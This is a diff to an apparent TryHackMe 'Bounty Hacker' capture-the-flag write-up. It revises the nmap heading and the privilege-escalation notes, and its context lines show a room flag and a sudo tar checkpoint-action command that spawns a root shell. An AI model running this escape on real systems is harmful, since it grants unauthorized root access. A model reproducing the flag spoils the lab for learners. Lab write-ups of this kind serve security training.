@@ -3,7 +3,7 @@
 
 ## machine_ip: *.*.*.*
 
-## nmap result:
+## nmap scan:
 ```
 Not shown: 969 filtered ports, 28 closed ports
 PORT   STATE SERVICE VERSION
@@ -59,8 +59,8 @@ Answer: THM{CR1M3_SyNd1C4T3}
 
 ## priv esc
 ```
-lin@bountyhacker:~/Desktop$ find / -perm /4000 2>/dev/null
-
+https://gtfobins.github.io/gtfobins/tar/
+sudo -l
 sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 
 ```
